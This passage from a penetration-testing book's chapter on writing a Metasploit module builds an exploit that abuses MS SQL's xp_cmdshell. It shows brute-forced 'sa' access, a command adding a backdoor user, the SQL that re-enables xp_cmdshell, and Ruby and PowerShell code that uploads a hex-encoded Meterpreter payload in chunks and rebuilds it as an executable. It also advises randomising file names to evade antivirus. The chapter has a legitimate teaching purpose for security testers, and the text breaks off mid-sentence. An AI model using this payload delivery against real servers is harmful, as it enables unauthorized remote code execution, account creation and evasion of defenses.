<html><head></head><body><section epub:type="chapter" id="building_your_own_module"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 13. Building Your Own Module</h2></div></div></div><p class="calibre2">Building your own Metasploit module is relatively simple, as long as you have some programming experience and an idea of what you want to build. Because Metasploit is primarily Ruby-based, we’ll be working in the Ruby programming language in this chapter. If you aren’t a Ruby ninja yet, but you have some exposure to the language, don’t fret; continue to practice and learn. It’s fairly easy to learn Ruby as you go. If you find yourself struggling with the concepts in this chapter, skip it for now, try to build up your Ruby knowledge, and revisit the chapter.<a id="IDX-CHP-13-0001" class="strong"/><a id="IDX-CHP-13-0002" class="strong"/><a id="IDX-CHP-13-0003" class="strong"/><a id="IDX-CHP-13-0004" class="strong"/><a id="IDX-CHP-13-0005" class="strong"/></p><p class="calibre2">In this chapter, we’ll write a module called <span class="strong"><em class="calibre4">mssql_powershell</em></span> to harness a technique released at the Defcon 18 Hacking Conference by Josh Kelley (winfang) and David Kennedy. This module targets Windows platforms with Microsoft’s PowerShell installed (the default on Windows 7).<a id="IDX-CHP-13-0006" class="strong"/></p><p class="calibre2">This module converts a standard MSF binary payload to a <span class="strong"><em class="calibre4">hex-blob</em></span> (a hexadecimal representation of binary data) that can be transmitted to a target system through Microsoft SQL commands. Once this payload is on the target system, a PowerShell script is used to convert the hexadecimal data back to a binary executable, execute it, and deliver a shell to the attacker. This module is already in Metasploit and was developed by one of the authors of this book; it’s a great lesson on how to build your own modules.<a id="IDX-CHP-13-0007" class="strong"/><a id="IDX-CHP-13-0008" class="strong"/><a id="IDX-CHP-13-0009" class="strong"/></p><p class="calibre2">The ability to convert a binary to hexadecimal, transmit it via MS SQL, and convert it back to binary is an excellent example of how powerful the Metasploit Framework can be. As you’re performing penetration tests, you will encounter many unfamiliar scenarios or situations; your ability to create or modify modules and exploits on the fly will give you that needed edge. As you begin to understand the Framework, you’ll be able to write these types of modules in a relatively short amount of time.<a id="IDX-CHP-13-0010" class="strong"/><a id="IDX-CHP-13-0011" class="strong"/><a id="IDX-CHP-13-0012" class="strong"/><a id="IDX-CHP-13-0013" class="strong"/><a id="IDX-CHP-13-0014" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="getting_command_execution_on_microsoft_s">Getting Command Execution on Microsoft SQL</h2></div></div></div><p class="calibre2">As mentioned in <a class="xref" href="part0010.html#meterpreter">Chapter 6</a>, most system administrators set the <span class="strong"><em class="calibre4">sa</em></span> (system administrator) account password to something weak, not realizing the impact of this simple mistake. The <span class="strong"><em class="calibre4">sa</em></span> account is installed by default with the SQL role of <span class="strong"><em class="calibre4">sysadmin</em></span>, and when you’re performing penetration tests, you can almost guarantee that a weak or blank <span class="strong"><em class="calibre4">sa</em></span> account will exist on Microsoft SQL Server instances. We will use the MS SQL instance that you built in <a class="xref" href="part0022.html#configuring_your_target_machines">Appendix A</a> to exploit a situation with our module. As discussed in <a class="xref" href="part0010.html#meterpreter">Chapter 6</a>, you initially scan the system with the Metasploit auxiliary modules and brute force the weak <span class="strong"><em class="calibre4">sa</em></span> account.</p><p class="calibre2">Once you have brute forced the <span class="strong"><em class="calibre4">sa</em></span> account, you can insert, drop, create, and perform most other tasks you would normally use in MS SQL. This includes calling an extended administrative-level stored procedure called <code class="literal">xp_cmdshell</code>, as discussed in <a class="xref" href="part0010.html#meterpreter">Chapter 6</a>. This stored procedure lets you execute underlying operating system commands under the same security context used by the SQL Server service (for example, Local System).</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">MS SQL installs with this stored procedure disabled in SQL Server 2005 and 2008, but you can re-enable it using SQL commands if you have the <span class="strong"><em class="calibre4">sysadmin</em></span> role within MS SQL. For example, you could use <code class="literal">SELECT loginname FROM master..syslogins WHERE sysadmin=1</code> to view all users with this level of access and then become one of those users. If you have the sysadmin role, you’re almost guaranteed a full-system compromise.<a id="IDX-CHP-13-0015" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">The following listing demonstrates how to run basic commands through Metasploit’s MS SQL modules:</p><a id="I_programlisting13_d1e14905" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> use msf &gt; <strong class="calibre3"><code class="calibre6">use admin/mssql/mssql_exec</code></strong>
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> msf auxiliary(mssql_exec) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

  Module options:

     Name      Current Setting                       Required  Description
     ----      ---------------                       --------  -----------
     CMD       cmd.exe /c echo OWNED &gt; C:\owned.exe  no        Command to execute
     PASSWORD                                        no        The password for the
                                                                 specified username
     RHOST                                           yes       The target address
     RPORT     1433                                  yes       The target port
     USERNAME  sa                                    no
        The username to authenticate as

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> msf auxiliary(mssql_exec) <strong class="calibre3"><code class="calibre6">&gt; set RHOST 172.16.32.136</code></strong>
  RHOST =&gt; 172.16.32.136
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> msf auxiliary(mssql_exec) &gt; <strong class="calibre3"><code class="calibre6">set CMD net user metasploit p@55w0rd /ADD</code></strong>
  CMD =&gt; net user metasploit p@55w0rd /ADD
  msf auxiliary(mssql_exec) &gt; <strong class="calibre3"><code class="calibre6">exploit</code></strong>

  [*] SQL Query: EXEC master..xp_cmdshell 'net user metasploit p@55w0rd /ADD'

   output
   ------
<img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/> The command completed successfully.

  [*] Auxiliary module execution completed
  msf auxiliary(mssql_exec) &gt;</pre><p class="calibre2">In this example, we first select the <span class="strong"><em class="calibre4">mssql_exec</em></span> auxiliary module at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e14957" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>, which calls the <code class="literal">xp_cmdshell</code> stored procedure to execute commands. Next, we view the module’s options at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e14966" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and set our target at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e14972" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> and the command to execute on the target at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e14979" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>. Finally, we run the exploit with <code class="literal">exploit</code>, and you can see at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e14988" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> that the exploit is successful. We’ve added a user to the system using the <code class="literal">xp_cmdshell</code> stored procedure. (At this point we could enter <code class="literal">net localgroup administrators metasploit /ADD</code> to add the user to the local administrators group on the compromised system.)<a id="IDX-CHP-13-0016" class="strong"/><a id="IDX-CHP-13-0017" class="strong"/><a id="IDX-CHP-13-0018" class="strong"/><a id="IDX-CHP-13-0019" class="strong"/><a id="IDX-CHP-13-0020" class="strong"/></p><p class="calibre2">You can think of the <span class="strong"><em class="calibre4">mssql_exec</em></span> module as a command prompt accessible via MS SQL.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="exploring_an_existing_metasploit_module">Exploring an Existing Metasploit Module</h2></div></div></div><p class="calibre2">Now we’ll examine what is actually occurring “under the hood” of the module we just worked with, <span class="strong"><em class="calibre4">mssql_exec</em></span>. This allows us to get a feel for how existing code is operating before we write our own. Let’s open the module with a text editor to see how it operates:</p><a id="I_programlisting13_d1e15031" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# nano modules/auxiliary/admin/mssql/mssql_exec.rb</pre><p class="calibre2">The following lines excerpted from the module yield a few important things worthy of note:</p><a id="I_programlisting13_d1e15035" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> require 'msf/core'

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> class Metasploit3 &lt; Msf::Auxiliary

      <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>include Msf::Exploit::Remote::MSSQL

          def run
                  <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>mssql_xpcmdshell(datastore['CMD'], true)
if mssql_login_datastore
          end</pre><p class="calibre2">The first line at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15062" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> tells us that this module will include all functionality from Metasploit’s core libraries. Next the class is set at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15068" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> with code that defines this as an auxiliary module that inherits certain characteristics of, for example, scanners, denial-of-service vectors, data retrieval, brute force attacks, and reconnaissance attempts.<a id="IDX-CHP-13-0021" class="strong"/><a id="IDX-CHP-13-0022" class="strong"/><a id="IDX-CHP-13-0023" class="strong"/><a id="IDX-CHP-13-0024" class="strong"/><a id="IDX-CHP-13-0025" class="strong"/><a id="IDX-CHP-13-0026" class="strong"/><a id="IDX-CHP-13-0027" class="strong"/></p><p class="calibre2">The <code class="literal">include</code> statement at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15101" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> is probably one of the most important lines, because it pulls in the MS SQL module from the core Metasploit libraries. Essentially, the MS SQL module handles all MS SQL–based communications and anything related to MS SQL. Finally, at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15107" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> it pulls a specific command from the Metasploit datastore.</p><p class="calibre2">Let’s examine the MS SQL function in the Metasploit core libraries to get a better understanding of its power. First, open <span class="strong"><em class="calibre4">mssql.rb</em></span> and then <span class="strong"><em class="calibre4">mssql_commands.rb</em></span> with the following commands, each in a different window:</p><a id="I_programlisting13_d1e15121" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">nano lib/msf/core/exploit/mssql.rb</code></strong>
root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">nano lib/msf/core/exploit/mssql_commands.rb</code></strong></pre><p class="calibre2">Press <span class="keycap">ctrl</span>-W in Nano to search for <code class="literal">mssql_xpcmdshell</code> in <span class="strong"><em class="calibre4">mssql.rb</em></span>, and you should find the definition that tells Metasploit how to use the <code class="literal">xp_cmdshell</code> procedure, as shown next:</p><a id="I_programlisting13_d1e15142" class="strong"/><pre class="programlisting">#
        # Execute a system command via xp_cmdshell
        #
        def mssql_xpcmdshell(cmd,doprint=false,opts={})
                force_enable = false
                begin
                        res = mssql_query("EXEC master..xp_cmdshell<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>
 '#{cmd}'<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>", false, opts)</pre><p class="calibre2">This listing defines the SQL query to be run against the server as a call to the <code class="literal">xp_cmdshell</code> stored procedure at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15162" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> and a variable that will be replaced with the command line the user requests to be executed at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15168" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. For instance, an attempt to add a user to the system would execute within MS SQL as <code class="literal">EXEC master..xp_cmdshell 'net user metasploit p@55w0rd! /ADD'</code> by setting the <code class="literal">cmd</code> variable to <code class="literal">'net user metasploit p@55w0rd! /ADD'</code>.</p><p class="calibre2">Now turn your attention to the <span class="strong"><em class="calibre4">mssql_commands.rb</em></span>, where the commands to enable the <code class="literal">xp_cmdshell</code> procedure live:</p><a id="I_programlisting13_d1e15192" class="strong"/><pre class="programlisting"># Re-enable the xp_cmdshell stored procedure in 2005 and 2008
def mssql_xpcmdshell_enable(opts={});
"exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec
master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;"<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/></pre><p class="calibre2">Here you can see the sequence of commands <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15201" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> issued to re-enable the <code class="literal">xp_cmdshell</code> stored procedure in MS SQL Server 2005 and 2008.</p><p class="calibre2">Now that you understand the functions we will be using in creating our own module, let’s get started.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="creating_a_new_module">Creating a New Module</h2></div></div></div><p class="calibre2">Suppose you’re working on a penetration test and you encounter a system running SQL Server 2008 and Microsoft Server 2008 R2. Because Microsoft removed <span class="strong"><em class="calibre4">debug.exe</em></span> on Windows 7 x64 and Windows Server 2008, these systems won’t allow you to convert executables in a traditional way as defined in <a class="xref" href="part0015.html#fast-track">Chapter 11</a>. That means you need to create a new module that will allow you to attack a Microsoft Server 2008 and SQL Server 2008 instance successfully.<a id="IDX-CHP-13-0028" class="strong"/><a id="IDX-CHP-13-0029" class="strong"/><a id="IDX-CHP-13-0030" class="strong"/><a id="IDX-CHP-13-0031" class="strong"/><a id="IDX-CHP-13-0032" class="strong"/></p><p class="calibre2">We’ll make certain assumptions for purposes of this scenario. First, you’ve already guessed that the SQL Server password is blank, and you have gained access to the <code class="literal">xp_cmdshell</code> stored procedure. You need to deliver a Meterpreter payload onto the system, but all ports other than 1433 are closed. You don’t know whether a physical firewall is in place or if the Windows-based firewall is in use, but you don’t want to modify the port list or turn off the firewall because that might raise suspicion.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="powershell">PowerShell</h3></div></div></div><p class="calibre2">Windows PowerShell is our only viable option here. PowerShell is a comprehensive Windows scripting language that allows you to access the full Microsoft .NET Framework from the command line. PowerShell’s active community works at extending the tool, making it a valuable tool for security professionals because of its versatility and compatibility with .NET. We aren’t specifically going to dive into how PowerShell works and its functions, but you should know that it is a full-fledged programmatic language available to you on newer operating systems.</p><p class="calibre2">We’ll create a new module that will use Metasploit to convert the binary code to hexadecimal (or Base64 if desired), and then echo it onto the underlying operating system. Then we’ll use PowerShell to convert the executable back to a binary that you can execute.<a id="IDX-CHP-13-0033" class="strong"/></p><p class="calibre2">To begin, we create a boilerplate by copying the <span class="strong"><em class="calibre4">mssql_payload</em></span> exploit as follows:</p><a id="I_programlisting13_d1e15263" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">cp modules/exploits/windows/mssql/mssql_payload.rb</code></strong>
      <strong class="calibre3"><code class="calibre6">modules/exploits/windows/mssql/mssql_powershell.rb</code></strong></pre><p class="calibre2">Next, we open the <span class="strong"><em class="calibre4">mssql_powershell.rb</em></span> file we just created and modify its code so that it looks just like the following. This is an exploit base shell. Take some time to review the various parameters and remember the topics covered in the previous chapters.</p><a id="I_programlisting13_d1e15275" class="strong"/><pre class="programlisting">require 'msf/core' # require core libraries

class Metasploit3 &lt; Msf::Exploit::Remote # define this as a remote exploit
     Rank = ExcellentRanking # reliable exploit ranking

     include Msf::Exploit::Remote::MSSQL # include the mssql.rb library

     def initialize(info = {}) # initialize the basic template
       <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>super(update_info(info,
               'Name'           =&gt; 'Microsoft SQL Server PowerShell Payload',
               'Description'    =&gt; %q{
                         This module will deliver our
 payload through Microsoft PowerShell
                              using MSSQL based attack vectors.
               },
               'Author'         =&gt; [ 'David Kennedy "ReL1K"
 &lt;kennedyd013[at]gmail.com&gt;'],
               'License'        =&gt; MSF_LICENSE,
               'Version'        =&gt; '$Revision: 8771 $',
               'References'     =&gt;
                    [
                         [ 'URL', 'http://www.secmaniac.com' ]
                    ],
             <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>'Platform'       =&gt; 'win', # target only windows
               'Targets'        =&gt;
                    [
                         [ 'Automatic', { } ], # automatic targeting
                    ],
             <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>'DefaultTarget'  =&gt; 0
               ))
          register_options( # register options for the user to pick from
               [

                 <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>
OptBool.new('UsePowerShell',[ false, "Use PowerShell as payload delivery
                        method instead", true]), # default to PowerShell
               ])
     end

     def exploit # define our exploit here; it does nothing at this point

        <img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/>handler # call the Metasploit handler
          disconnect # after handler disconnect
     end
end</pre><p class="calibre2">Before this exploit will work properly, you’ll need to define some basic settings. Notice that the name, description, licensing, and references are defined at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15309" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. We also define a platform at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15315" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> (Windows) and a target at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15321" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> (all operating systems). We also define a new parameter called <code class="literal">UsePowerShell</code> at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15330" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> for use in the body of the exploit. Lastly, a handler is specified at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15337" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> to handle the connections between the attacker and the exploited target.<a id="IDX-CHP-13-0034" class="strong"/><a id="IDX-CHP-13-0035" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="running_the_shell_exploit">Running the Shell Exploit</h3></div></div></div><p class="calibre2">With the skeleton of the exploit built, we run it through <span class="strong"><em class="calibre4">msfconsole</em></span> to see what options are available:</p><a id="I_programlisting13_d1e15361" class="strong"/><pre class="programlisting">msf &gt; <strong class="calibre3"><code class="calibre6">use windows/mssql/mssql_powershell</code></strong>
msf exploit(mssql_powershell) &gt; <strong class="calibre3"><code class="calibre6">show options</code></strong>

Module options:

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   PASSWORD                        no        The password for the specified username
   RHOST                           yes       The target address
   RPORT          1433             yes       The target port
   USERNAME       sa               no        The username to authenticate as
   UsePowerShell  true             no        Use PowerShell
 as payload delivery method instead</pre><p class="calibre2">Recall from <a class="xref" href="part0009.html#the_joy_of_exploitation">Chapter 5</a> that the <code class="literal">show options</code> command will display any new options that have been added to an exploit. After we set these options, they will be stored within Metasploit as valid options.<a id="IDX-CHP-13-0036" class="strong"/><a id="IDX-CHP-13-0037" class="strong"/><a id="IDX-CHP-13-0038" class="strong"/><a id="IDX-CHP-13-0039" class="strong"/><a id="IDX-CHP-13-0040" class="strong"/><a id="IDX-CHP-13-0041" class="strong"/><a id="IDX-CHP-13-0042" class="strong"/></p><p class="calibre2">Now we’ll finalize the <span class="strong"><em class="calibre4">mssql_powershell.rb</em></span> file, which we have been editing since the beginning of this chapter, before we edit <span class="strong"><em class="calibre4">mssql.rb</em></span> (which will be explained shortly).</p><p class="calibre2">When you examine the exploits in the <span class="strong"><em class="calibre4">modules</em></span> directory inside Metasploit (<span class="strong"><em class="calibre4">modules/exploits</em></span>, <span class="strong"><em class="calibre4">modules/auxiliary/</em></span>, and so on), you’ll notice that most of them have the same overall structure (<code class="literal">def</code> exploit as an example). Remember always to comment your code to give other developers an idea of what it’s doing! In the following listing, we first introduce our <code class="literal">def exploit</code> line, which defines what we’ll be doing in our exploit. We’ll frame our exploit the same way as the other modules and add a few new sections, as explained next:</p><a id="I_programlisting13_d1e15423" class="strong"/><pre class="programlisting">def exploit

          # if u/n and p/w didn't work throw error
          <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>if(not mssql_login_datastore)
               <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>print_status(<strong class="calibre3"><code class="calibre6">"Invalid SQL Server credentials"</code></strong>)
               return
          end

          # Use powershell method for payload delivery
          <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>if (datastore['UsePowerShell'])

          <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>powershell_upload_exec
(Msf::Util::EXE.to_win32pe(framework,payload.encoded))


            end
            handler
            disconnect
     end
end</pre><p class="calibre2">The module first checks to see if we are logged in at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15454" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. If we aren’t logged in, the error message <code class="literal">"Invalid SQL Server Credentials"</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15463" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> is displayed. The <code class="literal">UsePowerShell</code> method at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15472" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> is used to call the function <code class="literal">powershell_upload_exec</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15482" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>, which will automatically create a Metasploit-based payload that we specify during our exploit. After we finally run the exploit, when we specify our payload in <span class="strong"><em class="calibre4">msfconsole</em></span>, it will automatically generate it for us based on the <code class="literal">Msf::Util::EXE.to_win32pe(framework,payload.encoded)</code> option.<a id="IDX-CHP-13-0043" class="strong"/><a id="IDX-CHP-13-0044" class="strong"/><a id="IDX-CHP-13-0045" class="strong"/><a id="IDX-CHP-13-0046" class="strong"/><a id="IDX-CHP-13-0047" class="strong"/><a id="IDX-CHP-13-0048" class="strong"/><a id="IDX-CHP-13-0049" class="strong"/><a id="IDX-CHP-13-0050" class="strong"/></p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="creating_powershell_underscore_upload_un">Creating powershell_upload_exec</h3></div></div></div><p class="calibre2">Now we’ll open the <span class="strong"><em class="calibre4">mssql.rb</em></span> file that we opened earlier, in preparation for editing. We need to find space for the <code class="literal">powershell_upload_exec</code> function.<a id="IDX-CHP-13-0051" class="strong"/></p><a id="I_programlisting13_d1e15537" class="strong"/><pre class="programlisting">root@bt:/opt/framework3/msf3# <strong class="calibre3"><code class="calibre6">nano lib/msf/core/exploit/mssql.rb</code></strong></pre><p class="calibre2">In your version of Metasploit, you can do a search for PowerShell, and you should see the referenced code that follows in the <span class="strong"><em class="calibre4">mssql.rb</em></span> file. Feel free to delete this code from the file and start from scratch.</p><a id="I_programlisting13_d1e15546" class="strong"/><pre class="programlisting">#
     # Upload and execute a Windows binary through MS SQL queries and PowerShell
     #
     <img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/>def powershell_upload_exec(exe, debug=false)

          # hex converter
          <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>hex = exe.unpack("H*")[0]
          # create random alpha 8 character names
          <img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/>var_payload = rand_text_alpha(8)
          <img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/>print_status("Warning:
 This module will leave #{var_payload}.exe in the SQL
            Server %TEMP% directory")</pre><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15574" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> you see that our definition includes the commands <code class="literal">exe</code> and <code class="literal">debug</code> parameters that are added to the <code class="literal">def powershell_upload_exec</code> function. The <code class="literal">exe</code> command is the executable we will be sending from our original code <code class="literal">Msf::Util::EXE.to_win32pe(framework,payload.encoded)</code>, as mentioned previously. The <code class="literal">debug</code> command is set to <code class="literal">false</code>, which means we will not see debug information. Generally this would be set to <code class="literal">true</code> if you wanted to see additional information for troubleshooting.</p><p class="calibre2">Next, at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15607" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> we convert the entire encoded executable to raw hexadecimal format. The <code class="literal">H</code> in this line simply means “open the file as a binary and place it in a hexadecimal representation.”</p><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15618" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> we create a random, alphabetical, eight-character filename. It’s usually best to randomize this name to throw off antivirus software.</p><p class="calibre2">And finally, at <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15626" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> we tell the attacker that our payload will remain on the operating system, in the SQL Server <span class="strong"><em class="calibre4">/Temp</em></span> directory.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="conversion_from_hex_to_binary">Conversion from Hex to Binary</h3></div></div></div><p class="calibre2">The following listing shows the conversion from hexadecimal back to binary, written in PowerShell. The code is defined as a string to be called later and uploaded to the target machine.</p><a id="I_programlisting13_d1e15640" class="strong"/><pre class="programlisting"># Our payload converter grabs a hex file and converts it to binary through PowerShell

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> <strong class="calibre3"><code class="calibre6">h2b</code></strong> = "$s = gc 'C:\\Windows\\Temp\\#{<strong class="calibre3"><code class="calibre6">var_payload</code></strong>
}';$s = [string]::Join('', $s);$s= <img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>$s.
      Replace('`r',''); $s = $s.Replace(''`n','');$b = new-object byte[] $($s.Length/
      2);0..$($b.Length-1) | %{$b[$_] = [Convert]
::ToByte($s.Substring($($_*2),2),16)};
      [IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{<strong class="calibre3"><code class="calibre6">var_payload</code></strong>}.exe',$b)"

<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> h2b_unicode=Rex::Text.to_unicode(h2b)

  # base64 encoding allows us to perform execution through
 powershell without registry changes
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> h2b_encoded = Rex::Text.encode_base64(h2b_unicode)

<img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/> print_status("Uploading the payload #{var_payload}, please be patient...")</pre><p class="calibre2">At <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15684" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> we create the hex-to-binary (<code class="literal">h2b</code>) conversion method through PowerShell. This code essentially creates a byte array that will write out the hex-based Metasploit payload as a binary file. (The <code class="literal">{var_payload}</code> is a random name specified through Metasploit.)<a id="IDX-CHP-13-0052" class="strong"/><a id="IDX-CHP-13-0053" class="strong"/></p><p class="calibre2">Because MS SQL has character limit restrictions, we need to break our hexadecimal payload into 500-byte chunks that separate the payload into multiple requests. But one side effect of this splitting is that carriage returns and line feeds (CRLF) are added to the file on the target, and these need to be stripped out. At <span class="inlinemediaobject"><a id="I_inlinemediaobject13_d1e15704" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> we add better handling of CRLFs by stripping them out properly. If we didn’t do this, our binary would be corrupt and would not execute properly. Notice that we are simply redesignating the <code class="literal">$s</code> variable to replace <code class="literal">`r</code> and <code class="literal">`n</code> with <code class="literal">''</code> (nothing). This effectively removes CRLFs.</p><p class="calibre2">Once 